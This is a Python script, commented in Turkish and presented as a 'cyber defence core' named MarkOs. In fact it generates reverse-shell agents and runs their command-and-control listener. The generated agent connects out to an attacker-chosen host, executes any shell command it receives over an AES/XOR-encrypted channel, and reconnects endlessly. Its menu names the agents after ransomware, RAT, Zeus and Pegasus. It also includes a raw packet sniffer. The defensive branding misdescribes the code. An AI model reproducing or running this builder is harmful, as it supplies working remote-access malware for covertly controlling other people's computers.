#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# MarkOs Güvenli Kriptografik Siber Savunma Çekirdeği - Geliştirilmiş Sürüm

import os
import sys
import socket
import struct
import subprocess
import threading
import time
import ctypes
import json
import hashlib
import logging
from datetime import datetime

from colorama import Fore, Style, init

init(autoreset=True)

# ------------------------------------------------------------
# PyCryptodome doğrulaması
# ------------------------------------------------------------
try:
    from Crypto.Cipher import AES
    from Crypto.Random import get_random_bytes
    from Crypto.Util.Padding import pad, unpad
    HAS_CRYPTO = True
except ImportError:
    HAS_CRYPTO = False

# ------------------------------------------------------------
# Extern katmanı
# ------------------------------------------------------------
try:
    if sys.platform == "win32":
        kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
        extern_sleep = kernel32.Sleep
    else:
        libc = ctypes.CDLL(None)
        extern_sleep = libc.usleep
except Exception:
    extern_sleep = None

# ------------------------------------------------------------
# Loglama
# ------------------------------------------------------------
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[
        logging.FileHandler("markos_core.log", encoding="utf-8"),
        logging.StreamHandler(sys.stdout),
    ],
)
log = logging.getLogger("MarkOs")


# ============================================================
# Görsel etiketler
# ============================================================
def banner():
    print(Fore.CYAN + Style.BRIGHT + """
============================================================
       __  ___              ______ _  __ ______               _              
   /  |/  /____ _ _____ / // __ \ |/ //_  __/_____ ____   (_)___   ____  
  / /|_/ // __ `// ___// // / / /   /  / /  / ___// __ \ / // _ \ / __ \ 
 / /  / // /_/ // /   / // /_/ /   |  / /  / /   / /_/ // //  __// / / / 
/_/  /_/ \__,_/_/    /_/ \____/_/|_| /_/  /_/    \____//_/ \___//_/ /_/

   [ MarkOs Güvenli Kriptografik Siber Savunma Çekirdeği ]
============================================================
    """ + Style.RESET_ALL)
    if not HAS_CRYPTO:
        print(Fore.RED + "[!] PyCryptodome bulunamadı. Gerçek AES için: pip install pycryptodome" + Style.RESET_ALL)


def menu():
    print(Fore.YELLOW + Style.BRIGHT + "\n--- MARKOS OPERASYONEL KRİPTO PANELİ ---")
    print(Fore.WHITE + "1) Kriptografik Gerçek Ajan Üretici (AES-256 + XOR)")
    print(Fore.WHITE + "2) Gerçek Zamanlı Defans Monitörü (Aktif Soket Taraması)")
    print(Fore.WHITE + "3) Canlı Ağ Trafiği Dinleyici (Raw Sniffer)")
    print(Fore.WHITE + "4) Siber Ay Raporu (Kriptolu Yerel Ağ Analizi)")
    print(Fore.WHITE + "5) MİT Standartları Raporu (Şifreli Log Paketleme)")
    print(Fore.WHITE + "6) Dinleyici Başlat (Ajan Bağlantılarını Kabul Et)")
    print(Fore.WHITE + "7) Sistemden Güvenli Çıkış")
    print(Fore.YELLOW + "-----------------------------------------")


# ============================================================
# Kriptografi motoru
# ============================================================
class CryptoEngine:
    """AES-256-CBC + XOR çift aşamalı şifreleme motoru."""

    BLOCK = 16

    @staticmethod
    def xor_cipher(data: bytes, key: int) -> bytes:
        return bytes(b ^ key for b in data)

    @staticmethod
    def encrypt_pipeline(data_dict: dict, aes_key: bytes, xor_key: int) -> bytes:
        raw = json.dumps(data_dict).encode("utf-8")
        if HAS_CRYPTO:
            iv = get_random_bytes(CryptoEngine.BLOCK)
            cipher = AES.new(aes_key, AES.MODE_CBC, iv)
            return CryptoEngine.xor_cipher(iv + cipher.encrypt(pad(raw, AES.block_size)), xor_key)
        return CryptoEngine.xor_cipher(raw, xor_key)

    @staticmethod
    def decrypt_pipeline(encrypted_bytes: bytes, aes_key: bytes, xor_key: int) -> dict:
        dec = CryptoEngine.xor_cipher(encrypted_bytes, xor_key)
        if HAS_CRYPTO:
            iv, ct = dec[:CryptoEngine.BLOCK], dec[CryptoEngine.BLOCK:]
            cipher = AES.new(aes_key, AES.MODE_CBC, iv)
            raw = unpad(cipher.decrypt(ct), AES.block_size)
            return json.loads(raw.decode("utf-8"))
        return json.loads(dec.decode("utf-8"))


# ============================================================
# Soket yardımcıları (uzunluk-prefiksli çerçeve)
# ============================================================
def recvall(sock: socket.socket, n: int) -> bytes:
    """n byte'ı tam olarak okuyuncaya kadar recv çağırır."""
    buf = b""
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            raise ConnectionError("Bağlantı kapandı")
        buf += chunk
    return buf


def send_frame(sock: socket.socket, data: bytes):
    sock.sendall(struct.pack(">I", len(data)) + data)


def recv_frame(sock: socket.socket) -> bytes:
    (m_len,) = struct.unpack(">I", recvall(sock, 4))
    if m_len > 10 * 1024 * 1024:
        raise ValueError("Çok büyük çerçeve boyutu")
    return recvall(sock, m_len)


# ============================================================
# Sistem çekirdeği
# ============================================================
class MarkOsCore:

    def __init__(self, key_string: str, xor_byte: int):
        self.running = True
        self.xor_key = xor_byte
        self.aes_key = hashlib.sha256(key_string.encode()).digest()

    # --------------------------------------------------------
    def native_delay(self, seconds: float):
        try:
            if extern_sleep:
                if sys.platform == "win32":
                    extern_sleep(int(seconds * 1000))
                else:
                    extern_sleep(int(seconds * 1_000_000))
                return
        except Exception:
            pass
        time.sleep(seconds)

    # ---------- [Seçenek 1] Ajan üretici ----------
    def generate_real_crypto_agent(self, type_name: str, lhost: str, lport: int):
        log.info(f"{type_name} için kriptografik ajan scripti oluşturuluyor...")
        self.native_delay(1.0)

        template = f'''#!/usr/bin/env python3
# MarkOs Core - Şifreli İletişim Ajanı ({type_name})
import socket, subprocess, json, time, os, sys, struct
try:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad, unpad
    HAS_CRYPTO = True
except ImportError:
    HAS_CRYPTO = False

LHOST = "{lhost}"
LPORT = {lport}
AES_KEY = bytes.fromhex("{self.aes_key.hex()}")
XOR_KEY = {self.xor_key}

def xor_cipher(data, key):
    return bytes(b ^ key for b in data)

def decrypt_pipeline(enc):
    dec = xor_cipher(enc, XOR_KEY)
    if HAS_CRYPTO:
        iv, ct = dec[:16], dec[16:]
        c = AES.new(AES_KEY, AES.MODE_CBC, iv)
        return json.loads(unpad(c.decrypt(ct), 16).decode("utf-8"))
    return json.loads(dec.decode("utf-8"))

def send_pipeline(s, data_dict):
    raw = json.dumps(data_dict).encode("utf-8")
    if HAS_CRYPTO:
        iv = os.urandom(16)
        c = AES.new(AES_KEY, AES.MODE_CBC, iv)
        enc = xor_cipher(iv + c.encrypt(pad(raw, 16)), XOR_KEY)
    else:
        enc = xor_cipher(raw, XOR_KEY)
    s.sendall(struct.pack(">I", len(enc)) + enc)

def recvall(s, n):
    buf = b""
    while len(buf) < n:
        chunk = s.recv(n - len(buf))
        if not chunk:
            raise ConnectionError("closed")
        buf += chunk
    return buf

def execute(cmd):
    try:
        proc = subprocess.run(cmd, shell=True, capture_output=True, timeout=120)
        out = (proc.stdout + proc.stderr).decode("utf-8", errors="ignore")
        code = proc.returncode
    except subprocess.TimeoutExpired:
        out, code = "[!] Komut zaman aşımına uğradı (120s)", -1
    except Exception as e:
        out, code = f"[!] Çalıştırma hatası: {{e}}", -1
    if not out:
        out = "[i] Çıktı üretmedi."
    return {{"data": {{"out": out, "cwd": os.getcwd(), "exit": code}}}}

def start():
    while True:
        try:
            s = socket.create_connection((LHOST, LPORT), timeout=10)
            send_pipeline(s, {{"data": {{"info": f"Bağlandı {{os.getlogin() if hasattr(os,'getlogin') else 'user'}}@{{socket.gethostname()}} [{{sys.platform}}]", "cwd": os.getcwd()}}}})
            while True:
                enc = recvall(s, 4)
                (m_len,) = struct.unpack(">I", enc)
                payload = decrypt_pipeline(recvall(s, m_len))
                send_pipeline(s, execute(payload["cmd"]))
        except Exception:
            time.sleep(5)

if __name__ == "__main__":
    start()
'''
        filename = f"markos_{type_name.lower().replace(' ', '_')}_agent.py"
        try:
            with open(filename, "w", encoding="utf-8") as f:
                f.write(template)
            log.info(f"Ajan başarıyla üretildi: {filename}")
        except OSError as e:
            log.error(f"Ajan yazma hatası: {e}")

    # ---------- [Seçenek 6] Dinleyici ----------
    def start_listener(self, lhost: str, lport: int):
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind((lhost, lport))
        srv.listen(5)
        log.info(f"Dinleyici başlatıldı: {lhost}:{lport}")

        def handle(client, addr):
            log.info(f"Ajan bağlandı: {addr}")
            try:
                with client:
                    while True:
                        payload = CryptoEngine.decrypt_pipeline(
                            recv_frame(client), self.aes_key, self.xor_key
                        )
                        data = payload.get("data", {})
                        log.info(f"[{addr[0]}] Gelen: {json.dumps(data, ensure_ascii=False)[:300]}")
                        cmd = input(Fore.CYAN + f"shell@{addr[0]}> " + Fore.WHITE).strip()
                        if not cmd:
                            continue
                        if cmd.lower() in ("exit", "quit"):
                            break
                        send_frame(client, CryptoEngine.encrypt_pipeline(
                            {"cmd": cmd}, self.aes_key, self.xor_key))
            except Exception:
                log.info(f"Ajan bağlantısı kapandı: {addr}")

        try:
            while self.running:
                try:
                    srv.settimeout(1.0)
                    client, addr = srv.accept()
                    threading.Thread(target=handle, args=(client, addr), daemon=True).start()
                except socket.timeout:
                    continue
        except KeyboardInterrupt:
            log.info("Dinleyici kapatılıyor...")
        finally:
            srv.close()

    # ---------- [Seçenek 2] Defans monitörü ----------
    def run_real_defensive_monitor(self):
        log.info("GERÇEK ZAMANLI DEFANS MONİTÖRÜ AKTİF...")
        try:
            cmd = "netstat -ano" if sys.platform == "win32" else "ss -tulpn || netstat -tulpn"
            proc = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            lines = proc.stdout.splitlines()
            log.info(f"Toplam Aktif Ağ Soketi: {len(lines)}")
            for line in lines[:30]:
                print(Fore.WHITE + line)

            listening = [l for l in lines if "LISTEN" in l.upper()]
            log.info(f"Dinlenen Port Sayısı: {len(listening)}")
        except Exception as e:
            log.error(f"Defans tarama hatası: {e}")

    # ---------- [Seçenek 3] Sniffer ----------
    def run_real_sniffer(self, duration: int = 10):
        log.info(f"GERÇEK SNIFFER AKTİF: {duration} saniye...")
        packet_count = 0

        def capture():
            nonlocal packet_count
            sniffer = None
            try:
                if sys.platform == "win32":
                    sniffer = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_IP)
                    sniffer.bind((socket.gethostbyname(socket.gethostname()), 0))
                    sniffer.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                    sniffer.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON)
                else:
                    sniffer = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(3))

                start_time = time.time()
                while time.time() - start_time < duration:
                    raw_packet, _ = sniffer.recvfrom(65565)
                    packet_count += 1
                    print(Fore.WHITE +
                          f"[Paket #{packet_count}] {len(raw_packet)} byte | "
                          f"Hex: {raw_packet[:20].hex()}")
            except PermissionError:
                log.error("Sniffer için root/Administrator yetkisi gerekli!")
            except Exception as e:
                log.error(f"Sniffer hatası: {e}")
            finally:
                if sniffer and sys.platform == "win32":
                    try:
                        sniffer.ioctl(socket.SIO_RCVALL, socket.RCVALL_OFF)
                    except Exception:
                        pass
                if sniffer:
                    sniffer.close()
                log.info(f"Sniffer tamamlandı. Yakalanan paket: {packet_count}")

        t = threading.Thread(target=capture, daemon=True)
        t.start()
        t.join(timeout=duration + 5)

    # ---------- [Seçenek 4/5] Kurumsal raporlar ----------
    def generate_and_encrypt_institutional_data(self, mode: str):
        log.info(f"{mode} raporu oluşturuluyor...")
        try:
            cmd = "ipconfig /all" if sys.platform == "win32" else "ip addr show"
            proc = subprocess.run(cmd, shell=True, capture_output=True, text=True)

            hostname = socket.gethostname()
            report = {
                "mode": mode,
                "generated": datetime.now().isoformat(),
                "hostname": hostname,
                "local_ip": socket.gethostbyname(hostname),
                "network_dump": proc.stdout[:5000],
                "standards": "AES-256-CBC + XOR pipeline (SHA-256 türev anahtar)",
            }

            enc = CryptoEngine.encrypt_pipeline(report, self.aes_key, self.xor_key)
            fname = f"markos_{mode.lower()}_report.bin"
            with open(fname, "wb") as f:
                f.write(enc)
            log.info(f"Şifreli rapor kaydedildi: {fname} ({len(enc)} byte)")

            # Doğrulama (decrypt-back testi)
            dec = CryptoEngine.decrypt_pipeline(enc, self.aes_key, self.xor_key)
            log.info("Şifreleme/doğrulama döngüsü başarılı ✓")
            return fname
        except Exception as e:
            log.error(f"Rapor hatası: {e}")
            return None


# ============================================================
# Ana akış
# ============================================================
def ask_network_params():
    lhost = input(Fore.YELLOW + "Dinleme/Geri Bağlantı IP (LHOST): " + Fore.WHITE).strip()
    lport_s = input(Fore.YELLOW + "Port (LPORT): " + Fore.WHITE).strip()
    if not lhost or not lport_s.isdigit() or not (1 <= int(lport_s) <= 65535):
        print(Fore.RED + "[-] Geçerli IP ve Port (1-65535) girilmeli!")
        return None, None
    return lhost, int(lport_s)


def main():
    banner()
    key = input(Fore.YELLOW + "AES anahtar şifresi: " + Fore.WHITE).strip() or "markos_default"
    xor_s = input(Fore.YELLOW + "XOR anahtar baytı (0-255, varsayılan 42): " + Fore.WHITE).strip()
    xor_key = int(xor_s) if xor_s.isdigit() and int(xor_s) <= 255 else 42

    core = MarkOsCore(key, xor_key)
    log.info("Çekirdek başlatıldı. AES-256 anahtarı SHA-256 ile türetildi.")

    while True:
        menu()
        secim = input(Fore.CYAN + "Seçiminiz: " + Fore.WHITE).strip()

        try:
            if secim == "1":
                print(Fore.YELLOW + "\n--- Ajan Türü Seçin ---")
                print("1 - RanSoftWare Modeli\n2 - RAT Güvenli Oturum Modeli\n"
                      "3 - ADS WARE Ağ Analiz Modeli\n4 - ZeusT Ware Gelişmiş Modülü\n"
                      "5 - Pegasus Gelişmiş İzleme Modeli\n6 - Özel Şifreli İmza Çıktısı")
                sub = input(Fore.CYAN + "Seçiminiz (1-6): " + Fore.WHITE).strip()
                lhost, lport = ask_network_params()
                if lhost:
                    types = {"1": "RanSoftWare", "2": "RAT", "3": "ADS_WARE",
                             "4": "ZeusT_Ware", "5": "Pegasus", "6": "Ozel_Kripto_Imza"}
                    core.generate_real_crypto_agent(types.get(sub, "Genel_Kripto_Ajan"), lhost, lport)

            elif secim == "2":
                core.run_real_defensive_monitor()

            elif secim == "3":
                d = input(Fore.YELLOW + "Dinleme süresi (sn, varsayılan 10): " + Fore.WHITE).strip()
                core.run_real_sniffer(int(d) if d.isdigit() else 10)

            elif secim == "4":
                core.generate_and_encrypt_institutional_data("Siber_Ay")

            elif secim == "5":
                core.generate_and_encrypt_institutional_data("MIT")

            elif secim == "6":
                lhost, lport = ask_network_params()
                if lhost:
                    core.start_listener("0.0.0.0", lport)

            elif secim == "7":
                log.info("Çekirdek kripto oturumu sonlandırıldı.")
                break

            else:
                print(Fore.RED + "[-] Geçersiz operasyon kodu.")

        except KeyboardInterrupt:
            print(Fore.YELLOW + "\n[!] Operasyon durduruldu. Panele dönülüyor.")
        except Exception as e:
            log.error(f"Kritik Çekirdek Hatası: {e}")


if __name__ == "__main__":
    main()
